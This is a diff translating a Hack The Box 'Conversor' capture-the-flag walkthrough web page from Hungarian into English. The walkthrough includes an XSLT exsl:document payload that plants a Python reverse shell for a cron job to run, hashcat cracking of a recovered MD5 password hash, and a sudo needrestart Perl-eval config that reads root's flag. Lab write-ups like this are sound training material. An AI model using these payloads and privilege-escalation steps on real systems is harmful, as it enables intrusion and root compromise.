@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang='hu'>
+<html lang='en'>
 <head>
     <meta charset='UTF-8'>
     <meta name='viewport' content='width=device-width, initial-scale=1.0'>
@@ -23,16 +23,27 @@
 </head>
 <body>
     <div class="container">
-        <h1>HTB Conversor - Walkthrough</h1>
+        <h1>HTB Conversor – Walkthrough</h1>
 
         <div class="section">
-            <p>A Conversor egy Flask alapú webalkalmazás volt, amely XSLT injekció sebezhetőséget tartalmazott. Az <code>exsl:document</code> kiterjesztés tetszőleges fájlírást tett lehetővé, amit egy cron job-bal párosítva initial access-hez vezetett. A privilege escalation során egy sudoers bejegyzés biztosított utat a root jogosultsághoz.</p>
+            <p>
+                Conversor is a Flask-based web application vulnerable to XSLT injection.
+                The <code>exsl:document</code> extension allowed arbitrary file write,
+                which, when combined with an existing cron job, led to initial code execution.
+                Privilege escalation was achieved through a permissive sudoers entry,
+                ultimately granting root-level access.
+            </p>
         </div>
 
         <div class="section">
-            <h2>1. Felderítés</h2>
-            <span class="tag tag-info">INFORMÁCIÓ</span>
-            <p>Az nmap scan két nyitott portot mutatott: SSH-t a 22-n és HTTP-t a 80-on. A weboldal egy XML/XSLT konvertáló szolgáltatás volt Flask-ben. Az <code>/about</code> oldalon publikálták a teljes forráskódot (<code>source_code.tar.gz</code>), ami white-box tesztelést tett lehetővé.</p>
+            <h2>1. Reconnaissance</h2>
+            <span class="tag tag-info">INFORMATION</span>
+            <p>
+                An initial Nmap scan revealed two open services: SSH on port 22 and HTTP on port 80.
+                The web service exposed an XML/XSLT conversion feature implemented in Flask.
+                Notably, the <code>/about</code> page published the full application source code
+                as <code>source_code.tar.gz</code>, enabling a white-box style analysis.
+            </p>
 
             <pre><code># nmap -sC -sV conversor.htb
 PORT   STATE SERVICE VERSION
@@ -42,14 +53,27 @@ PORT   STATE SERVICE VERSION
 
         <div class="section">
             <h2>2. Initial Access</h2>
-            <span class="tag tag-success">SIKER</span>
-            <p>A forráskód elemzése során kiderült, hogy a rendszer <code>libxslt</code>-t használ, és nincs letiltva az <code>exsl:document</code> kiterjesztés. Ez azt jelentette, hogy XSLT templateken keresztül tetszőleges fájlokat lehet írni a szerverre.</p>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Source code review revealed that the application relied on <code>libxslt</code>
+                without disabling the <code>exsl:document</code> extension.
+                This made it possible to write arbitrary files to the filesystem
+                via crafted XSLT templates.
+            </p>
 
-            <p>Az <code>install.md</code> alapján egy cron job percenként futtatja a <code>/var/www/conversor.htb/scripts/</code> mappában található Python fájlokat <code>www-data</code> jogosultsággal:</p>
+            <p>
+                According to <code>install.md</code>, a cron job executes every minute
+                and runs all Python scripts located in
+                <code>/var/www/conversor.htb/scripts/</code>
+                with <code>www-data</code> privileges:
+            </p>
 
             <pre><code>* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code></pre>
 
-            <p>Kombináltam a két vektort: XSLT-vel írtam egy reverse shell-t a scripts mappába, majd vártam, hogy a cron lefuttassa.</p>
+            <p>
+                By combining these two vectors, I used XSLT to write a Python reverse shell
+                into the monitored scripts directory and waited for the cron job to execute it.
+            </p>
 
             <h3>XSLT Payload</h3>
             <pre><code>&lt;xsl:stylesheet version="1.0"
@@ -69,64 +93,108 @@ pty.spawn("/bin/bash")
     &lt;/xsl:template&gt;
 &lt;/xsl:stylesheet&gt;</code></pre>
 
-            <p>Kb. egy perc várakozás után megérkezett a shell <code>www-data</code> jogosultsággal.</p>
+            <p>
+                After approximately one minute, a reverse shell was received
+                with <code>www-data</code> privileges.
+            </p>
         </div>
 
         <div class="section">
-            <h2>3. Sikertelen megközelítések</h2>
-            <span class="tag tag-failure">ZSÁKUTCA</span>
-            <p>Mielőtt a működő exploit útvonalra bukkantam volna, több irányból próbálkoztam:</p>
+            <h2>3. Failed Approaches</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <p>
+                Before identifying the successful exploitation path,
+                several alternative techniques were tested:
+            </p>
             <ul>
-                <li><strong>XXE fájl olvasás:</strong> Az XML entitások működtek, de a <code>/view</code> endpoint nem reflektálta a tartalmakat, csak előnézetet renderelt.</li>
-                <li><strong>PHP webshell:</strong> A static könyvtárba próbáltam PHP fájlokat írni, de az Apache nem értelmezi PHP-ként a statikus tartalmakat.</li>
-                <li><strong>XSLT PHP függvények:</strong> A <code>php:function</code> namespace nincs engedélyezve a libxslt-ben.</li>
+                <li>
+                    <strong>XXE file disclosure:</strong>
+                    XML entities were processed, but the <code>/view</code> endpoint
+                    rendered only previews and did not reflect file contents.
+                </li>
+                <li>
+                    <strong>PHP webshell:</strong>
+                    PHP files written into the static directory were not executed,
+                    as Apache treated the directory strictly as static content.
+                </li>
+                <li>
+                    <strong>XSLT PHP functions:</strong>
+                    The <code>php:function</code> namespace was disabled in <code>libxslt</code>.
+                </li>
             </ul>
-            <p>Ezek után fordítottam figyelmet az <code>exsl:document</code> és a cron job kombinációjára.</p>
+            <p>
+                These dead ends shifted focus toward the combination of
+                <code>exsl:document</code> and the scheduled cron execution.
+            </p>
         </div>
 
         <div class="section">
             <h2>4. User Flag</h2>
-            <span class="tag tag-success">SIKER</span>
-            <p>A <code>www-data</code> shell-lel hozzáfértem a Flask alkalmazás SQLite adatbázisához (<code>/var/www/conversor.htb/instance/users.db</code>). Az adatbázisban egy felhasználói hash volt:</p>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With a <code>www-data</code> shell, I accessed the Flask application's SQLite
+                database located at <code>/var/www/conversor.htb/instance/users.db</code>.
+                The database contained a single user hash:
+            </p>
 
             <pre><code>fismathack:5b5c3ac3a1c897c94caad48e6c71f**c</code></pre>
 
-            <p>MD5 hash, amit hashcat-tel törtem fel a rockyou szótár alapján:</p>
+            <p>
+                The hash was identified as MD5 and cracked using Hashcat with the rockyou wordlist:
+            </p>
 
             <pre><code>$ hashcat -m 0 hash.txt rockyou.txt
 5b5c3ac3a1c897c94caad48e6c71f**c:Keepmesafeandw**m</code></pre>
 
-            <p>SSH-n beléptem a <code>fismathack</code> accountba, és megszereztem a user flaget.</p>
+            <p>
+                Using the recovered credentials, I authenticated via SSH as
+                <code>fismathack</code> and retrieved the user flag:
+            </p>
 
             <pre><code>585c0dfa9bb3a20d524643300cc5b1**</code></pre>
         </div>
 
         <div class="section">
             <h2>5. Privilege Escalation</h2>
-            <span class="tag tag-success">SIKER</span>
-            <p>A <code>sudo -l</code> parancs érdekes eredményt adott:</p>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Running <code>sudo -l</code> revealed an interesting configuration:
+            </p>
 
             <pre><code>User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>
 
-            <p>A <code>needrestart</code> egy Perl-ben írt utility, ami újraindítandó szolgáltatásokat detektál. Van egy <code>-c</code> kapcsolója, amivel egyedi konfigurációs fájlt lehet betölteni. A forráskód alapján ez a config fájl Perl kódként kerül értelmezésre <code>eval</code>-lal.</p>
+            <p>
+                <code>needrestart</code> is a Perl-based utility used to detect services
+                requiring a restart. The <code>-c</code> option allows loading a custom
+                configuration file, which the application evaluates using <code>eval</code>,
+                effectively executing arbitrary Perl code as root.
+            </p>
 
-            <p>Készítettem egy Perl payloadot, ami a root flag tartalmát egy die üzenetben jelenítette meg:</p>
+            <p>
+                I created a minimal Perl payload that displayed the contents of the root flag
+                through a <code>die</code> statement:
+            </p>
 
             <pre><code>$ cat exploit.conf
 die "DEBUG: " . `cat /root/root.txt`;
 
 $ sudo /usr/sbin/needrestart -c exploit.conf</code></pre>
 
-            <p>A script elszállt a die miatt, de a standard error kiírta a root flaget:</p>
+            <p>
+                The script terminated as expected, but the error output revealed the root flag:
+            </p>
 
             <pre><code>a98902419c02ec72e3dcd059b507a3**</code></pre>
 
-            <p>Természetesen ugyanígy lehetett volna teljes root shell-t is nyitni, de a flag megszerzése volt a cél.</p>
+            <p>
+                A full interactive root shell could have been obtained using the same technique,
+                but extracting the flag was sufficient to complete the challenge.
+            </p>
         </div>
 
         <div class="footer">
-            <p>HTB Conversor | 2025. december 25.</p>
+            <p>HTB Conversor Walkthrough | 2025.dec.25</p>
         </div>
     </div>
 </body>
